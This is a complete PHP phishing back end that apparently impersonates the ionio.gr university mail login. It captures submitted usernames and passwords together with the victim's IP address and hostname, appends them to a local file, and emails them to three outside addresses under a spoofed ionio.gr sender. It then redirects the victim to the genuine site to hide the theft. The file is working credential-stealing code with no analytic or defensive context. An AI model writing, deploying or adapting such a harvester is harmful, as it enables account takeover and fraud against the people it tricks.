<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Username : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "\n";
$msg .= "--------------smtp.ionio.gr 587------------\n\n";
$post = "lanlogs@yandex.com,lanplentyresults21@protonmail.com,lanplentyresults@myself.com";
$fp = fopen("use.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "$ip - ".$_POST['username']."\n";
$from = "From: ionio.gr<info@ionio.gr>";
mail("$post",$subj, $msg, $from);
header("Location:   https://ionio.gr/gr/news/all-news/");  

?>
